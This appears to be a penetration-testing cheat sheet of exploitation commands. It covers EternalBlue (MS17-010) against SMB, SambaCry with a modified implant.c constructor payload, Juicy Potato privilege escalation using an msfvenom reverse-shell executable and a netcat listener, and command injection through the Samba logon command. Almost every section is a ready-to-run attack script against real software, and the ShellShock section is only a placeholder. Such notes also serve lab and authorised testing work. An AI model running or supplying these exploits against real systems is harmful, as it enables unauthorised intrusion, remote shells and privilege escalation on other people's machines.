<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit.md">Top of Page</a> |
  <a href="/CheatSheets/2_exploit.md#bottom-of-page">Bottom of Page</a>
</p>

# Exploit
## Table of Contents
* [CVE-2017-0144: EternalBlue](#cve-2017-0144-eternalblue)
* [CVE-2017-7494: SambaCry](#cve-2017-7494-sambacry)
* [CVE-2014-6271: ShellShock via SMTP](#cve-2014-6271-shellshock-via-smtp)
* [Juicy Potato](#juicy-potato)
* [Shell via Samba Logon Command](#shell-via-samba-logon-command)

## CVE-2017-0144: EternalBlue
Exploiting this vulnerability requires access to a Named Pipe. 
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
pip install impacket
python check.py $TARGET # check if target is vulnerable and find an accessible Named Pipe
python zzz_exploit.py $TARGET $NAMED_PIPE
```

## CVE-2017-7494: SambaCry
Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired. 
```bash
mkdir exploits
cd exploits
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
mv implant.c implant.bak
vim implant.c
```

An example of a modified implant.c file. This source file gets compiled by the provided Python script. 
```c
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
setresuid(0,0,0);
system("ping -c2 $LHOST");
}
```

My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.
```bash
sudo tcpdump -i tun0 icmp 
```

Run the exploit. 
```bash
python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
```

## CVE-2014-6271: ShellShock via SMTP
```bash
# code goes here
```

## Juicy Potato
```bash
# download Juicy Potato
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# upload Juicy Potato
# ftp, smb, http, etc.

# create a reverse shell and then upload it to the target
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse-shell.exe
sudo nc -nvlp $LPORT

# use Juicy Potato to execute your reverse shell
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```

## Shell via Samba Logon Command
```bash
mkdir /mnt/$TARGET
sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
sudo cp $EXPLOIT /mnt/$TARGET
smbclient //$TARGET/$SHARE
logon "=`$EXPLOIT`"
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit.md">Top of Page</a> |
  <a href="/CheatSheets/2_exploit.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
